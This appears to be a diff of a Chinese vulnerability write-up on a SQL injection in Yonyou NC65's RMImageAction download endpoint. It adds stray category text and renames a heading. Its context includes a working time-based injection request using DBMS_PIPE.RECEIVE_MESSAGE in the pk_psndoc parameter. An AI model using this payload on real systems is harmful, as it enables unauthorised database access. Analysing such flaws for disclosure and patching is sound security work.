@@ -30,6 +30,14 @@ NC65
 
 nc/bs/hrss/pub/action/RMImageAction.class
 
+深入探索
+
+工程与技术
+
+计算机服务器
+
+网络
+
 ```
 package nc.bs.hrss.pub.action;
 
@@ -147,7 +155,7 @@ public class RMImageAction extends BaseAction {
 
 pk\_psndoc 参数直接代入 queryAggRMPsndocVO 函数，其实现逻辑如下
 
-漏洞修复方案
+漏洞分析报告
 
 ```
 private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
@@ -287,7 +295,7 @@ Host: nc65.mrxn.net
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用示例
 
-漏洞修复方案
+漏洞分析报告
 
 ```
 GET /portal/pt/rmImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',6)-- HTTP/1.1
